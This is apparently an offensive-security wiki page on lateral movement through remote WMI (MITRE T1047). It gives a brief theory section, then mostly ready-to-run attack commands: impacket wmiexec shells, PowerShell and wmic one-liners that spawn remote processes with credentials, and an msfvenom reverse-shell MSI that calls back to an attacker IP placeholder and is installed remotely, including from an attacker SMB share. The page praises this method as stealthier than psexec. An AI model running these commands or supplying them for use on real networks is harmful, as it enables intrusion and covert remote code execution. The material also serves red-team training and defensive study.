---
description: MITRE ATT&CK™  Windows Management Instrumentation - Technique T1047
---

# Remote WMI

## Theory

Windows Management Instrumentation (WMI) provides a standardized way for querying and managing various elements of a Windows operating system. It allow administrators to perform standard management tasks that attackers can abuse to perform lateral movements.

When using WMI remotely, the client application establishes a connection to the WMI service on the remote Windows machine. This connection is made using **DCOM (Distributed Component Object Model)** as the underlying transport protocol. The client initiates an RPC (Remote Procedure Call) connection to communicate with the WMI DCOM infrastructure on the remote system.

Once the DCOM connection is established, the [MS-WMI](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-wmi/c0088a94-1107-48a5-8d4d-cd16d34de5ef) protocols (Microsoft WMI Extensions to DCOM) comes into play. **MS-WMI protocols provides additional functionality that is specific to WMI operations** over the DCOM protocol. These extensions enhance DCOM to handle WMI-specific tasks such as executing WMI queries, invoking methods, and retrieving system information.

{% hint style="success" %}
This method is much more discreet than the one used by psexec, smbexec and the other main tools in the impacket suite.
{% endhint %}

## Practice

### Remote Process Creation Using WMI

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/fortra/impacket)'s [wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) script give you a semi-interactive shell by leveraging DCOM and the MS-WMI protocol.

```bash
#Execute commands over MS-WMI
wmiexec.py <domain>/<username>:<password>@<target>
```
{% endtab %}

{% tab title="Windows - Powershell" %}
We can spawn a process on a remote target using wmi and powershell cmdlets

#### Powershell v1+ (2006)

```powershell
#Create PSCredentials and execute commands on remote target
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force));
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-WmiMethod -ComputerName "TARGET" -Credential $credential -Class Win32_Process -Name Create -ArgumentList $Command

#One-liner style
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force)); $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"; Invoke-WmiMethod -ComputerName "TARGET" -Credential $credential -Class Win32_Process -Name Create -ArgumentList $Command
```

#### Powershell v3+ (2012)

```powershell
#Create CimSession and execute commands on remote target
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force))))
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }

#One-liner style
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop; $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
We can spawn a process on a remote target using wmic.exe

```bash
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```
{% endtab %}
{% endtabs %}

### Remote MSI Installation Using WMI

{% tabs %}
{% tab title="Windows - Powershell" %}
We can install a MSI package on a remote target using wmi and powershell cmdlets. Let's create a malicious MSI using msfvenom:

```bash
#Generate an evil package
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT> -f msi > evil64.msi
```

#### Powershell v1+ (2006)

```powershell
#Create PSCredentials and install MSI on remote target
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force));
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\Windows\evil64.msi") -ComputerName "TARGET" -Credential $credential

#One-liner style
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force)); Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\Windows\evil64.msi") -ComputerName "TARGET" -Credential $credential
```

#### Powershell v3+ (2012)

```powershell
#Create CimSession and install MSI on remote target
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force))))
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\evil64.msi"; Options = ""; AllUsers = $false}

#One-liner style
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop; Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\evil64.msi"; Options = ""; AllUsers = $false}
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
We can install a MSI package on a remote target using wmic.exe. Let's create a malicious MSI using msfvenom:

```bash
#Generate an evil package & host it on SMB server
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT> -f msi > evil64.msi
```

Execute following commands

```bash
#Frome a remote share (may not works)
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=\\ATTACKING_IP\Share\evil64.msi

#Upload 
net use \\TARGET\c$ PASSWORD /user:DOMAIN\USER; copy C:\experiments\evil64.msi \\TARGET\c$\PerfLogs\setup.msi ; wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\PerfLogs\setup.msi
```
{% endtab %}
{% endtabs %}

## Resources



{% embed url="https://tryhackme.com/room/lateralmovementandpivoting" %}

{% embed url="https://www.ired.team/offensive-security/lateral-movement/wmi-via-newscheduledtask" %}

{% embed url="https://www.ired.team/offensive-security/lateral-movement/wmi-+-msi-lateral-movement" %}
